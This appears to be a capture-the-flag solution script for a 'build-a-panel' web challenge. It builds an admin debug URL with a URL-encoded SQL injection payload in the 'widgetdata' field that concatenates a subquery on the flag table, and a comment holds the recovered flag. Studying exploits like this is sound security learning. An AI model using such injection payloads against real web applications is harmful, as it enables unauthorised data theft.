import urllib.parse

base_url = 'https://build-a-panel.dicec.tf/admin/debug/add_widget?'
params = {
        'panelid': 'hogehogefugafuga',
        'widgetname': 'wn',
        'widgetdata': '''"' || (SELECT flag FROM flag) || '"');--'''
        }


def main():
    url = base_url
    for k, v in params.items():
        url += k + '=' + urllib.parse.quote(v) + '&'
    url = url[:-1]
    print(url)


main()


# dice{ch41n_ChAIn_aNd_m0Re_cHaIn}
